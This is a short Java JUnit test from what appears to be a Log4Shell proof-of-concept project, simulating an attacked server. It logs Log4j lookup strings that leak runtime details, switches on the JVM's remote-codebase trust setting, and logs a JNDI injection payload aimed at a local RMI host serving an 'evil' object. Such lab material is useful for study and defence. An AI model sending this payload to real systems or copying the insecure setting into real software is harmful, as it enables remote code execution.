package cn.burningbright.poc;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Test;


/**
 * Unit test for simple App.
 * Simulate the attacked server
 * @author chenguang.lin
 * @date 2021-12-15
 */
public class AppTest {

    /**
     * Rigorous Test :-)
     */
    @Test
    public void log4j23202() {
        Logger logger = LogManager.getLogger();
        logger.info("hello {}", "${date:YYYY-MM-dd} : ${java:runtime} - ${java:vm} - ${java:os}");

        // jdk8u121 7u131 6u141 默认false，rmi不执行远程字节码
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        logger.info("remote {}", "${jndi:rmi://127.0.0.1:1019/evil}");
    }

}
